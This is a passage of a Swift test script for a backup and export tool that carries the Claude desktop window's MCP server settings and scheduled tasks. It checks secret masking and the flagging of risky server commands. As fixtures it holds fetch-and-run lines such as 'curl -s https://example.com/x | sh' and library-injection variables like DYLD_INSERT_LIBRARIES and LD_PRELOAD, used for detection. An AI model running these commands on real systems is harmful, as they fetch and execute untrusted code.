// Window checks for cl_audit: the Claude window's own settings and scheduled tasks travel with Export, Import, Backup and Restore
// (format version 3). Sources/SessionsBackup.swift (the config item, a backup's scheduled tasks' prompts), SessionsExport.swift (a zip
// leaves the config out, an image carries it scrubbed), SessionsImport.swift (what a file may hold), SessionsRestoreWindow.swift (the
// plans: MCP settings create-only for the whole file, an import's tasks paused, create-only per file, with their prompts and sessions;
// SessionsBackup.configAllowlist: only mcpServers of claude_desktop_config.json is ever written, on export and on restore/import),
// WindowRows.swift and the Export page's words.
//
// Part 1 works on real files in a throwaway home: a profile with a window (Code-tab entries, a task file, claude_desktop_config.json
// with MCP servers) and a Claude Code folder (transcripts, the tasks' prompts); exports to a zip and an encrypted image; imports into a
// profile with nothing and into one that has its own; Undo; a restore from this Mac's own backup; doctored images (a config that is
// huge, not JSON, a link, a folder; a crafted task; a prompt without its task; formats). Part 2 reads the rows' words.
// Runs only with CFFIXED_USER_HOME = .../Checks/.work/window/home (Checks/run.sh sets and guards it). Fake data only: example.com
// addresses, zero-pattern ids, made-up servers and values. Nothing here opens an app, the Dock or Terminal; the images are made and
// opened with hdiutil in the throwaway folder.

import AppKit
import Foundation
import ProfileCore

setbuf(stdout, nil)
let home = NSHomeDirectory()
guard home.hasSuffix("/Checks/.work/window/home") else { print("refusing: HOME is \(home)"); exit(2) }
BackupPrefs.store = MemoryPrefs()          // never the real ~/Library/Preferences
let fm = FileManager.default
var passed = 0, failed = 0
func check(_ ok: Bool, _ what: String, line: Int = #line) {
    if ok { passed += 1 } else { failed += 1; print("FAIL (line \(line)): \(what)") }
}

func sid(_ n: Int) -> String { "00000000-0000-4000-8000-" + String(format: "%012d", n) }
func write(_ path: String, _ text: String) {
    try? fm.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
    fm.createFile(atPath: path, contents: Data(text.utf8))
}
func read(_ path: String) -> String? { fm.contents(atPath: path).map { String(decoding: $0, as: UTF8.self) } }
func files(_ dir: String) -> [String] {
    var out: [String] = []
    if let e = fm.enumerator(atPath: dir) { for case let r as String in e { var isDir: ObjCBool = false; if fm.fileExists(atPath: dir + "/" + r, isDirectory: &isDir), !isDir.boolValue { out.append(r) } } }
    return out.sorted()
}
/// Every file's path and bytes under a folder, as one string: equal means unchanged.
func tree(_ dir: String) -> String { files(dir).map { "\($0)=\(SwitchEngine.sha(fm.contents(atPath: dir + "/" + $0) ?? Data()))" }.joined(separator: "\n") }
func json(_ d: Data?) -> [String: Any]? { d.flatMap { (try? JSONSerialization.jsonObject(with: $0)) as? [String: Any] } }
func resetRestores() { try? fm.removeItem(at: SessionsRestore.root); try? fm.removeItem(at: SwitchEngine.root) }
func mode(_ path: String) -> Int { var s = stat(); lstat(path, &s); return Int(s.st_mode & 0o7777) }
func same(_ a: [String: Any], _ b: [String: Any]) -> Bool { (a as NSDictionary).isEqual(to: b) }

// the made-up values a zip must never hold (no key shape: only "the image carries it" protects them)
let envValue = "env-value-not-a-real-secret-w0"
let headerValue = "header-value-not-a-real-secret-w0"
let settingsEnvValue = "settings-env-not-a-real-secret-w0"
/// Whether any file under a folder holds these bytes.
func holds(_ dir: String, _ s: String) -> [String] { files(dir).filter { (fm.contents(atPath: dir + "/" + $0) ?? Data()).range(of: Data(s.utf8)) != nil } }

MainActor.assumeIsolated {
    resetRestores(); SessionsRestore.runningSessions = { [] }
    let w = home + "/w"
    try? fm.removeItem(atPath: w)
    try! fm.createDirectory(atPath: w, withIntermediateDirectories: true)
    let place = URL(fileURLWithPath: w + "/place"), out = w + "/out"
    try! fm.createDirectory(atPath: out, withIntermediateDirectories: true)
    BackupPrefs.shared.place = place.path
    let pw = "w-test-password-not-secret"

    // ---- the source profile: its window (account sid(1) / organisation sid(2)) and its Claude Code folder
    let seatA = SeatID(account: sid(1), organization: sid(2))
    let dataA = w + "/Claude-a", codeA = w + "/.claude-a"
    let scopeA = "\(dataA)/claude-code-sessions/\(sid(1))/\(sid(2))"
    // the 6.x window's file (key names as the Claude app 6.6395.1 writes them, fake values): the MCP servers, the sidebar part, the
    // permission and consent state and this Mac's paths and device state, and keys a later app might add (at the top level and under
    // preferences). Only the allowlist (mcpServers) ever travels
    let foreignPrefs: [String: Any] = [
        "bypassPermissionsGateByAccount": ["acct-fake-1": true], "bypassPermissionsOptInByAccount": ["acct-fake-1": true],
        "localAgentModeTrustedFolders": ["/w/trusted-elsewhere"], "simulatorDeviceConsent": ["sim-fake-1": "granted"],
        "launchPreviewLocalNetworkAccessDeclinedOrigins": ["http://192.0.2.1:3000"], "launchPreviewPersistedWorkspaces": ["/w/workspace-elsewhere"],
        "launchPreviewStorage": ["slot": "fake"], "remoteToolsDeviceName": "fake-device-name", "menuBarEnabled": true,
        "futurePrefKey2099": ["grantedEverything": true]]
    // the window's sidebar records (preferences.epitaxyPrefs): the two keys the sidebar step uses, and what never travels beside them
    // (a folder permission mode, and a key a later app might add)
    let sidebarFixture: [String: Any] = [
        "dframe-group-scopes": ["\(sid(1))/\(sid(2))": ["groups": [["id": "cg-1", "name": "Work", "mode": "code"]], "assignments": [String: Any](), "order": [String: Any]()]],
        "dframe-code-sections": ["\(sid(1))/\(sid(2))": ["sections": [["id": "cg-1", "kind": "manual", "order": 1, "shown": true]]]],
        "epitaxy-folder-permission-mode-v2.\(sid(1))": ["/w/project": "bypassPermissions", "/w/other": "auto"],
        "epitaxyFutureKey2099": ["grantedEverything": true]]
    /// A sidebar/epitaxyPrefs.json file holds the sidebar allowlist's two keys and nothing else (no permission mode, no later key).
    func sidebarOnly(_ d: Data?) -> Bool {
        guard let d, let j = json(d), let text = String(data: d, encoding: .utf8) else { return false }
        return Set(j.keys) == SessionsBackup.sidebarAllowlist && !text.contains("permission-mode") && !text.contains("bypassPermissions")
            && !text.contains("FutureKey")
    }
    let mcpFixture: [String: Any] = [
        "github": ["command": "npx", "args": ["-y", "@example/server-github"], "env": ["GITHUB_TOKEN": envValue]],
        "remote": ["url": "https://mcp.example.com/sse", "headers": ["Authorization": "Bearer \(headerValue)"]]]
    let config: [String: Any] = [
        "mcpServers": mcpFixture,
        "globalShortcut": "Alt+Space", "coworkUserFilesPath": w + "/cowork-files-elsewhere", "futureTopLevelKey2099": ["grantedEverything": true],
        "preferences": foreignPrefs.merging(["epitaxyPrefs": sidebarFixture]) { a, _ in a }]
    // what never travels, by a word of each: none of these may be in a config cl_audit writes (an image's, or the window's file it adds)
    let foreignMarks = ["bypassPermissions", "TrustedFolders", "trusted-elsewhere", "simulatorDeviceConsent", "192.0.2.1", "workspace-elsewhere",
                        "launchPreviewStorage", "fake-device-name", "menuBarEnabled", "futurePrefKey2099", "futureTopLevelKey2099",
                        "cowork-files-elsewhere", "globalShortcut", "preferences", "epitaxy"]
    /// The config holds the allowlist's keys only (mcpServers, with the fixture's servers whole) and no word of what never travels.
    func allowlistOnly(_ d: Data?) -> Bool {
        guard let d, let j = json(d), let text = String(data: d, encoding: .utf8) else { return false }
        return Set(j.keys) == SessionsBackup.configAllowlist && (j["mcpServers"] as? [String: Any])?.keys.sorted() == ["github", "remote"]
            && !foreignMarks.contains { text.contains($0) }
    }
    func plantA() {
        try? fm.removeItem(atPath: dataA); try? fm.removeItem(atPath: codeA)
        try! JSONSerialization.data(withJSONObject: config, options: [.prettyPrinted, .sortedKeys]).write(to: URL(fileURLWithPath: dataA + "/claude_desktop_config.json").createDirs())
        write("\(scopeA)/local_\(sid(10)).json", #"{"sessionId":"local_\#(sid(10))","cliSessionId":"\#(sid(110))","title":"ordinary","cwd":"/w/project","isArchived":false}"#)
        write("\(scopeA)/local_\(sid(11)).json", #"{"sessionId":"local_\#(sid(11))","cliSessionId":"\#(sid(111))","title":"digest run","cwd":"/w/project","scheduledTaskId":"nightly-digest","isArchived":false}"#)
        let tasks: [[String: Any]] = [
            ["id": "nightly-digest", "displayName": "Nightly digest", "cronExpression": "0 3 * * *", "enabled": true, "filePath": codeA + "/scheduled-tasks/nightly-digest/SKILL.md",
             "cwd": "/w/project", "createdAt": 1_700_000_000_000, "permissionMode": "default", "lastRunAt": 1_700_000_100_000,
             "chromePermissionMode": "skip_all_permission_checks", "permissionModeCarried": true],
            ["id": "weekly-report", "displayName": "Weekly report", "cronExpression": "0 9 * * 1", "enabled": false, "filePath": codeA + "/scheduled-tasks/weekly-report/SKILL.md",
             "cwd": "/w/project", "createdAt": 1_700_000_000_000, "permissionMode": "bypassPermissions", "approvedPermissions": ["Bash(ls:*)"]],
            ["id": "elsewhere-task", "displayName": "Elsewhere", "cronExpression": "0 1 * * *", "enabled": true, "filePath": w + "/somewhere/prompt.md", "createdAt": 1],
            ["id": "Bad Id", "displayName": "Bad id", "cronExpression": "0 1 * * *", "enabled": true, "createdAt": 1]]
        try! JSONSerialization.data(withJSONObject: ["scheduledTasks": tasks], options: [.prettyPrinted, .sortedKeys]).write(to: URL(fileURLWithPath: scopeA + "/scheduled-tasks.json"))
        write("\(codeA)/scheduled-tasks/nightly-digest/SKILL.md", "---\nname: nightly-digest\n---\nSummarise yesterday's commits.\n")
        write("\(codeA)/scheduled-tasks/weekly-report/SKILL.md", "---\nname: weekly-report\n---\nWrite the weekly report.\n")
        write("\(codeA)/scheduled-tasks/elsewhere-task/SKILL.md", "elsewhere prompt\n")
        write("\(codeA)/scheduled-tasks/orphan-prompt/SKILL.md", "a prompt no task names\n")
        write("\(codeA)/scheduled-tasks/nightly-digest/notes.txt", "not the prompt: never carried\n")
        write("\(codeA)/CLAUDE.md", "# rules\n")
        write("\(codeA)/settings.json", #"{"env":{"DEPLOY_TOKEN":"\#(settingsEnvValue)","REGION":"eu-west-1"},"model":"opus","permissions":{"allow":["Bash(ls:*)"]}}"#)
        write("\(codeA)/projects/-w-project/\(sid(110)).jsonl", #"{"type":"user","cwd":"/w/project","text":"hello"}"# + "\n")
        write("\(codeA)/projects/-w-project/\(sid(111)).jsonl", #"{"type":"user","cwd":"/w/project","text":"digest"}"# + "\n")
        for f in files("\(codeA)/projects") { try? fm.setAttributes([.modificationDate: Date().addingTimeInterval(-3 * 86400)], ofItemAtPath: "\(codeA)/projects/\(f)") }
    }
    plantA()
    let srcA = SessionsBackup.Source(profile: "a", dataDir: dataA, codeDir: codeA)

    // ---- what a backup takes
    if case .data(let d) = SessionsBackup.windowConfig(dataDir: dataA) {
        check(allowlistOnly(d) && ((json(d)?["mcpServers"] as? [String: Any])?["github"] as? [String: Any]).flatMap { ($0["env"] as? [String: Any])?["GITHUB_TOKEN"] as? String } == envValue,
              "config (write side): only the allowlist is taken (mcpServers, whole); no permission or consent setting, no path of this Mac, no sidebar part, no key a later app adds")
    } else { check(false, "config: the window's file is read") }
    check(SessionsBackup.configAllowlist == ["mcpServers"] && SessionsBackup.configPart == "mcpServers", "config: the allowlist is mcpServers alone, and the item's part says so")
    check(SessionsBackup.sidebarAllowlist == ["dframe-code-sections", "dframe-group-scopes"] && sidebarOnly(SessionsBackup.sidebarRecords(dataDir: dataA)),
          "sidebar (write side): the records taken are the sections and groups alone: no folder permission mode, no key a later app adds")
    // default deny: a file of nothing but keys off the allowlist (or an empty mcpServers) is taken as none
    var offList = config; offList.removeValue(forKey: "mcpServers")
    let dataOff = w + "/Claude-off"
    for (label, body) in [("only keys off the allowlist", offList), ("an empty mcpServers", offList.merging(["mcpServers": [String: Any]()]) { a, _ in a }),
                          ("a mcpServers that isn't an object", offList.merging(["mcpServers": "npx evil"]) { a, _ in a })] {
        try! JSONSerialization.data(withJSONObject: body).write(to: URL(fileURLWithPath: dataOff + "/claude_desktop_config.json").createDirs())
        check(SessionsBackup.windowConfig(dataDir: dataOff) == .none, "config (write side): a file with \(label) is taken as none: nothing written")
    }
    check(SessionsExport.configPreview(SessionsExport.Part(profile: "off", name: "Off", source: SessionsBackup.Source(profile: "off", dataDir: dataOff, codeDir: w + "/.claude-off"))) == SessionsExport.ConfigPreview(),
          "export page: such a file shows as none")
    // a name that would fake another line (a newline) or turn a line around (a bidi mark) is shown as one plain line
    let faked = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": ["echo\ncalendar: python3 cal.py": ["command": "e\u{202E}cho\u{2028}x"]]]))
    check(faked.count == 1 && faked[0].name == "echocalendar: python3 cal.py" && faked[0].runs == "echo x" && !faked[0].full.unicodeScalars.contains { $0.value == 0x202E || $0.value == 0x2028 },
          "config: server names and commands are one plain line each: no newline, no bidi mark, no line separator (a separator reads as a space): \(faked)")
    check(SessionsRestore.taskName(["displayName": "Nightly\u{2067} digest\n"], id: "x") == "Nightly digest", "tasks: a task's name the same")
    let fakeKey = "gh" + "p_" + String(repeating: "A", count: 36)      // a key the scan recognises, cut so this file holds none
    let launcherFlag = { (p: String) in "runs \(p), a shell, interpreter or launcher: its arguments are what it runs" }
    let keyFlag = "an argument looks like a key (shown as ‹a key›): check where it came from"
    let inline = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": ["gh\u{200B}\u{E0041}x": ["command": "npx -y pkg --token=tok-w0", "args": ["--more", fakeKey, "a b", 3]]]]))
    check(inline.count == 1 && inline[0].name == "ghx" && inline[0].runs == "npx -y pkg --token=tok-w0 --more ‹a key› \"a b\" 3" && inline[0].full == inline[0].runs
          && !inline[0].full.contains(fakeKey) && inline[0].flags == [launcherFlag("npx"), keyFlag] && inline[0].env.isEmpty,
          "config: the whole command line, the command string's own words then args; an argument the key scan recognises is ‹a key› and flags the server; zero-width and tag characters dropped: \(inline)")
    let envFirst = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": ["x": ["command": "API_KEY=tok-w1 DEBUG=1 npx -y pkg", "env": ["TOKEN": "tok-w2", "REGION": "eu"]]]]))
    check(envFirst.count == 1 && envFirst[0].runs == "API_KEY=… DEBUG=… npx -y pkg" && envFirst[0].env == ["API_KEY", "DEBUG", "REGION", "TOKEN"]
          && !"\(envFirst)".contains("tok-w1") && !"\(envFirst)".contains("tok-w2") && !"\(envFirst)".contains("eu\"") && envFirst[0].flags == [launcherFlag("npx")],
          "config: the NAME=value words before the program show their name only; env keys by name, never a value: \(envFirst)")
    check(SessionsBackup.mcpServers(fm.contents(atPath: dataA + "/claude_desktop_config.json")!).map { "\($0.name)=\($0.runs)" } == ["github=npx -y @example/server-github", "remote=a remote server (its address isn't shown)"]
          && SessionsBackup.mcpServers(fm.contents(atPath: dataA + "/claude_desktop_config.json")!).first?.env == ["GITHUB_TOKEN"],
          "config: each MCP server by name and its command line, or a remote server (never an env value, header or URL)")
    // only the leading words set the environment: a NAME=value argument after the program is shown whole, a shell payload included
    let inArgs = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": [
        "payload": ["command": "npx", "args": ["-c", "A=1; curl https://example.com/x|sh"]],
        "plain-assign": ["command": "/opt/mcp/bin/srv", "args": ["MODE=fast", "B=2"]]]]))
    check(inArgs.first { $0.name == "payload" }.map { $0.runs == "npx -c \"A=1; curl https://example.com/x|sh\"" && $0.full == $0.runs && $0.flags == [launcherFlag("npx")] && $0.env.isEmpty } == true
          && inArgs.first { $0.name == "plain-assign" }.map { $0.runs == "/opt/mcp/bin/srv MODE=fast B=2" && $0.flags.isEmpty && $0.env.isEmpty } == true,
          "config: a NAME=value argument after the program is shown in full, on the row and in the tooltip (npx -c \"A=1; …\" with its flag): \(inArgs.map { "\($0.runs) \($0.flags)" })")
    // the program's name whatever its case or quotes (the disk is case-insensitive)
    let variants = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": [
        "v1": ["command": "/bin/SH", "args": ["-c", "x"]], "v2": ["command": "\"/usr/bin/Python3\" -m srv"], "v3": ["command": "'BASH'"],
        "v4": ["command": "/usr/local/bin/Docker", "args": ["run", "img"]], "v5": ["command": "caffeinate", "args": ["-i", "srv"]]]]))
    check(variants.map { $0.flags.first ?? "none" } == [launcherFlag("sh"), launcherFlag("python3"), launcherFlag("bash"), launcherFlag("docker"), launcherFlag("caffeinate")]
          && variants[1].runs == "\"/usr/bin/Python3\" -m srv",
          "config: /bin/SH, a quoted Python3, 'BASH', Docker and caffeinate are each flagged by their lowercase name: \(variants.map { $0.flags })")
    // a shell, interpreter or launcher, or a loader variable, is flagged in one line; a long command line is cut, with the whole of it kept
    let risky = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": [
        "a-shell": ["command": "/bin/sh", "args": ["-c", "curl -s https://example.com/x | sh"]],
        "b-node": ["command": "node", "args": ["./x.js"]],
        "c-preload": ["command": "npx", "args": ["-y", "pkg"], "env": ["DYLD_INSERT_LIBRARIES": "/tmp/x.dylib", "NODE_OPTIONS": "--require /tmp/y.js"]],
        "d-env": ["command": "env", "args": ["LD_PRELOAD=/tmp/z.so", "python3.12", "-m", "srv"]],
        "e-long": ["command": "uvx", "args": [String(repeating: "x", count: 300)]],
        "f-plain": ["command": "/opt/mcp/bin/server-files", "args": ["--root", "/w/files"]],
        "g-huge": ["command": "/opt/mcp/bin/srv", "args": [String(repeating: "y", count: 5000)]]]]))
    let byName = Dictionary(uniqueKeysWithValues: risky.map { ($0.name, $0) })
    check(byName["a-shell"]?.runs == "/bin/sh -c \"curl -s https://example.com/x | sh\"" && byName["a-shell"]?.flags == [launcherFlag("sh")]
          && byName["b-node"]?.flags == [launcherFlag("node")]
          && byName["c-preload"]?.flags == [launcherFlag("npx"), "sets DYLD_INSERT_LIBRARIES, NODE_OPTIONS, which change what a program loads"]
          && byName["c-preload"]?.env == ["DYLD_INSERT_LIBRARIES", "NODE_OPTIONS"] && !"\(risky)".contains("/tmp/x.dylib") && !"\(risky)".contains("/tmp/y.js")
          && byName["d-env"]?.runs == "env LD_PRELOAD=… python3.12 -m srv" && byName["d-env"]?.env == ["LD_PRELOAD"] && !"\(risky)".contains("/tmp/z.so")
          && byName["d-env"]?.flags == [launcherFlag("env"), "sets LD_PRELOAD, which changes what a program loads"]
          && byName["e-long"]?.runs.count == SessionsBackup.runsWidth && byName["e-long"]?.runs.hasSuffix("…") == true && byName["e-long"]?.full.count == 304
          && byName["f-plain"]?.flags.isEmpty == true
          && byName["g-huge"]?.full.count == 4000 && byName["g-huge"]?.full.hasSuffix("…") == true,
          "config: a shell, interpreter or launcher (sh, node, npx, env, uvx) and a loader variable (DYLD_*, NODE_OPTIONS; LD_PRELOAD after env) are flagged; env values never shown; a long line cut, whole in its tooltip, a huge one cut there with …: \(risky.map { "\($0.name): \($0.runs.prefix(60)) \($0.flags)" })")
    var flaggedPlan = SessionsRestore.ConfigPlan(); flaggedPlan.present = true; flaggedPlan.servers = risky
    var oneFlagged = flaggedPlan; oneFlagged.servers = [byName["a-shell"]!, byName["f-plain"]!]
    check(WindowWords.flagged(flaggedPlan) == "5 servers need a look before you add them: each runs a shell, interpreter or launcher, sets a loader variable, or holds an argument that looks like a key."
          && WindowWords.flagged(oneFlagged) == "1 server needs a look before you add it: it runs a shell, interpreter or launcher, sets a loader variable, or holds an argument that looks like a key."
          && WindowWords.serverLines(byName["c-preload"]!) == ["c-preload: npx -y pkg", "  env: DYLD_INSERT_LIBRARIES, NODE_OPTIONS (values not shown)",
                                                               "  look first: \(launcherFlag("npx")); sets DYLD_INSERT_LIBRARIES, NODE_OPTIONS, which change what a program loads"]
          && WindowWords.serverLines(byName["f-plain"]!) == ["f-plain: /opt/mcp/bin/server-files --root /w/files"],
          "rows: the closed row says how many servers need a look; each server's lines: its command line, its env names, what to look at")
    // an `env` program's own NAME=value words are masked up to the program it runs (whose arguments then show whole); a key inside an
    // argument is hidden in place, the rest of the argument readable; more loader names
    let envMasked = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": [
        "h-env": ["command": "env", "args": ["API_KEY=hunter2", "npx", "x", "MODE=fast"]],
        "i-inline": ["command": "/opt/mcp/bin/srv", "args": ["--auth=Bearer:" + fakeKey + ",scope=read"]],
        "j-loaders": ["command": "/opt/mcp/bin/srv", "env": ["PROMPT_COMMAND": "x", "GIT_SSH_COMMAND": "x", "BASH_FUNC_ls%%": "x", "NODE_EXTRA_CA_CERTS": "x"]]]]))
    let em = Dictionary(uniqueKeysWithValues: envMasked.map { ($0.name, $0) })
    check(em["h-env"]?.runs == "env API_KEY=… npx x MODE=fast" && em["h-env"]?.full == em["h-env"]?.runs && em["h-env"]?.env == ["API_KEY"]
          && !"\(envMasked)".contains("hunter2") && em["h-env"]?.flags == [launcherFlag("env")]
          && em["i-inline"]?.runs == "/opt/mcp/bin/srv --auth=Bearer:‹a key›,scope=read" && em["i-inline"]?.flags == [keyFlag] && !"\(envMasked)".contains(fakeKey)
          && em["j-loaders"]?.flags == ["sets BASH_FUNC_ls%%, GIT_SSH_COMMAND, NODE_EXTRA_CA_CERTS, …, which change what a program loads"]
          && SessionsBackup.isLoaderVariable("PERL5OPT") && SessionsBackup.isLoaderVariable("PERL5LIB") && SessionsBackup.isLoaderVariable("RUBYOPT")
          && SessionsBackup.isLoaderVariable("PROMPT_COMMAND"),
          "config: env API_KEY=hunter2 npx x shows API_KEY=…, the program env runs and its arguments whole; a key inside an argument hidden in place; PROMPT_COMMAND, GIT_SSH_COMMAND, BASH_FUNC_*, NODE_EXTRA_CA_CERTS flagged: \(envMasked.map { "\($0.name): \($0.runs) \($0.flags)" })")
    // env's options don't end the masking: -i, -u NAME, -C dir as they are; -S's string split and read the same way; any name with
    // "=" (quoted, dotted, dashed) masked
    let envOptions = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": [
        "k-i": ["command": "env", "args": ["-i", "A=x1", "prog"]],
        "l-u": ["command": "env", "args": ["-u", "X", "B=x2", "prog"]],
        "m-S": ["command": "env", "args": ["-S", "C=x3 prog --flag"]],
        "n-odd": ["command": "env", "args": ["\"D=x4\"", "a.b=x5", "A-B=x6", "prog"]],
        "o-packed": ["command": "env", "args": ["-SE=x7 prog"]],
        "q-S-opts": ["command": "env", "args": ["-S", "-i A=x8 -u X B=x9 prog"]],
        "r-cluster": ["command": "env", "args": ["-vSA=y1 prog"]],
        "s-cluster2": ["command": "env", "args": ["-iSA=y2"]],
        "t-argv0": ["command": "env", "args": ["-a", "name", "C2=y3", "prog"]],
        "u-quoted": ["command": "E2=\"my secret\" npx x"],
        "v-attached": ["command": "env", "args": ["-P/data", "F2=z1", "prog"]],
        "w-escaped": ["command": "G2=\"a\\\" z2\" H2=b\\ z3 npx x"],
        "x-abbrev": ["command": "env", "args": ["--unse", "X", "I2=z4", "--spl", "J2=z5 prog"]],
        "y-dash": ["command": "env", "args": ["-", "K2=z6", "prog"]]]]))
    let eo = Dictionary(uniqueKeysWithValues: envOptions.map { ($0.name, $0) })
    let eoText = "\(envOptions)"
    check(eo["k-i"]?.runs == "env -i A=… prog" && eo["l-u"]?.runs == "env -u X B=… prog" && eo["m-S"]?.runs == "env -S \"…\""
          && eo["n-odd"]?.runs == "env \"D=… a.b=… A-B=… prog" && eo["o-packed"]?.runs == "env -S…"
          && eo["q-S-opts"]?.runs == "env -S \"…\"" && eo["r-cluster"]?.runs == "env -vS…" && eo["s-cluster2"]?.runs == "env -iS…"
          && eo["t-argv0"]?.runs == "env -a name C2=… prog" && eo["u-quoted"]?.runs == "E2=… npx x"
          && eo["v-attached"]?.runs == "env -P/data F2=… prog" && eo["w-escaped"]?.runs == "G2=… H2=… npx x"
          && eo["x-abbrev"]?.runs == "env --unse X I2=… --spl \"…\"" && eo["y-dash"]?.runs == "env - K2=… prog"
          && ["x1", "x2", "x3", "x4", "x5", "x6", "x7", "x8", "x9", "y1", "y2", "y3", "secret", "z1", "z2", "z3", "z4", "z5", "z6"].allSatisfy { !eoText.contains($0) }
          && envOptions.filter { !["u-quoted", "w-escaped"].contains($0.name) }.allSatisfy { $0.flags.contains(launcherFlag("env")) }
          && eo["u-quoted"]?.flags == [launcherFlag("npx")] && eo["u-quoted"]?.env == ["E2"],
          "config: env -i, -u NAME, -S \"…\", a packed -S, quoted/dotted/dashed names: no value shown, env flagged: \(envOptions.map { "\($0.name): \($0.runs) \($0.flags)" })")
    // an env option it doesn't know (it may take a value) ends what can be read: one "…" for the rest, and a flag saying so
    let unreadFlag = SessionsBackup.envUnreadFlag
    let envUnknown = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": [
        "u1-long": ["command": "env", "args": ["--frob", "A3=s1", fakeKey, "prog"]],
        "u2-short": ["command": "env", "args": ["-iX", "A4=s2", "prog"]],
        "u3-glued": ["command": "env", "args": ["-xs3", "prog"]],
        "u4-long-value": ["command": "env", "args": ["--frob=s4", "prog"]],
        "u5-ambiguous": ["command": "env", "args": ["--i", "A5=s5", "prog"]],
        "u6-no-value": ["command": "env", "args": ["--null=s6", "prog"]],
        "u7-last": ["command": "env", "args": ["-i", "--frob"]],
        "u8-command": ["command": "env -L s7 A6=s8 prog"],
        "u9-known": ["command": "env", "args": ["-0iv", "--ignore-environment", "--null", "--debug", "--block-signal", "--default-signal=INT", "--ignore-signal",
                                                "--list-signal-handling", "--chdir", "/d", "-C/e", "--argv0=n", "--ignore-e", "--", "A7=s9", "prog"]]]]))
    let eu = Dictionary(uniqueKeysWithValues: envUnknown.map { ($0.name, $0) })
    let euText = "\(envUnknown)"
    check(eu["u1-long"]?.runs == "env --frob …" && eu["u2-short"]?.runs == "env -iX …" && eu["u3-glued"]?.runs == "env -x… …"
          && eu["u4-long-value"]?.runs == "env --frob=… …" && eu["u5-ambiguous"]?.runs == "env --i …" && eu["u6-no-value"]?.runs == "env --null=… …"
          && eu["u7-last"]?.runs == "env -i --frob" && eu["u8-command"]?.runs == "env -L …"
          && ["s1", "s2", "s3", "s4", "s5", "s6", "s7", "s8", fakeKey].allSatisfy { !euText.contains($0) }
          && envUnknown.filter { $0.name != "u9-known" }.allSatisfy { $0.flags == [launcherFlag("env"), unreadFlag] }
          && eu["u9-known"]?.full == "env -0iv --ignore-environment --null --debug --block-signal --default-signal=… --ignore-signal --list-signal-handling --chdir /d -C/e --argv0=… --ignore-e -- A7=… prog"
          && eu["u9-known"]?.flags == [launcherFlag("env")] && envOptions.allSatisfy { !$0.flags.contains(unreadFlag) },
          "config: an env option it doesn't know (long, a short letter in a cluster, glued, ambiguous, a value on one that takes none) hides the rest as one \"…\" and flags the server; every option env has reads as before: \(envUnknown.map { "\($0.name): \($0.runs) \($0.flags)" })")
    let found = Setup.scan(codeDir: codeA, home: home)
    let prompts = found.files.filter { $0.unit.kind == .task }.map(\.rel).sorted()
    check(prompts == ["scheduled-tasks/elsewhere-task/SKILL.md", "scheduled-tasks/nightly-digest/SKILL.md", "scheduled-tasks/orphan-prompt/SKILL.md", "scheduled-tasks/weekly-report/SKILL.md"],
          "scan: each task's prompt (scheduled-tasks/<id>/SKILL.md), nothing else of that folder: \(prompts)")
    check(Setup.pathProblem(["scheduled-tasks", "x", "SKILL.md"]) == nil && Setup.pathProblem(["scheduled-tasks", "x", "notes.txt"]) != nil && Setup.pathProblem(["scheduled-tasks", "Bad Id", "SKILL.md"]) != nil
          && Setup.pathProblem(["scheduled-tasks", "..", "SKILL.md"]) != nil && Setup.pathProblem(["Scheduled-Tasks", "x", "SKILL.md"]) != nil && Setup.pathProblem(["scheduled-tasks", "x.md"]) != nil,
          "names: only scheduled-tasks/<id>/SKILL.md, the id as the window keeps one; another file, another case or a bad id is refused")
    let bA = try! SessionsBackup.make(srcA, kind: .manual, place: place)
    let bAdir = SessionsBackup.folder(profile: "a", place: place).appendingPathComponent(bA.id).path
    check(bA.version == 3 && !bA.items.contains { $0.role == .config } && bA.configLeftOut == nil && !fm.fileExists(atPath: bAdir + "/config")
          && bA.items.filter { $0.role == .setup && $0.path.hasPrefix("setup/scheduled-tasks/") }.count == 4,
          "backup (plain): format 3, the 4 prompts, and no claude_desktop_config.json (only the encrypted export carries it)")
    check(sidebarOnly(fm.contents(atPath: bAdir + "/sidebar/epitaxyPrefs.json")), "backup (plain): sidebar/epitaxyPrefs.json holds the sections and groups alone")
    check(holds(bAdir, envValue).isEmpty && holds(bAdir, headerValue).isEmpty && holds(bAdir, "mcpServers").isEmpty && !SessionsBackup.summary(bA).contains("MCP"),
          "backup (plain): no MCP env value, header or server list in any of its files: \(holds(bAdir, envValue))")
    let bAsettings = json(fm.contents(atPath: bAdir + "/setup/settings.json"))
    let bAitem = bA.items.first { $0.path == "setup/settings.json" }
    check(bA.envBlanked == true && (bAsettings?["env"] as? [String: String]) == ["DEPLOY_TOKEN": "", "REGION": ""] && bAsettings?["model"] as? String == "opus"
          && holds(bAdir, settingsEnvValue).isEmpty && bAitem?.sha == SwitchEngine.sha(fm.contents(atPath: bAdir + "/setup/settings.json") ?? Data())
          && bAitem?.bytes == Int64(fm.contents(atPath: bAdir + "/setup/settings.json")?.count ?? -1),
          "backup (plain): settings.json keeps its env names with blank values, the rest as parsed; the value's bytes are nowhere in it; the item's hash and size are the blanked file's")
    // a settings.json that isn't a JSON object is never copied raw: left out of the backup (with the scripts its hooks would run), and listed
    do {
        let cU = w + "/.claude-u"
        try? fm.removeItem(atPath: cU)
        write(cU + "/settings.json", #"{"env":{"X":"\#(settingsEnvValue)"},, not json"#); write(cU + "/CLAUDE.md", "rules\n")
        let bU = try! SessionsBackup.make(SessionsBackup.Source(profile: "u", dataDir: "", codeDir: cU), kind: .manual, window: false, place: place)
        let dirU = SessionsBackup.folder(profile: "u", place: place).appendingPathComponent(bU.id).path
        check(!bU.items.contains { $0.path == "setup/settings.json" } && bU.setupLeftOut?.contains(Setup.settingsUnreadable) == true && bU.items.contains { $0.path == "setup/CLAUDE.md" }
              && holds(dirU, settingsEnvValue).isEmpty, "backup (plain): a settings.json that isn't a JSON object is left out and listed, never copied raw: \(bU.setupLeftOut ?? [])")
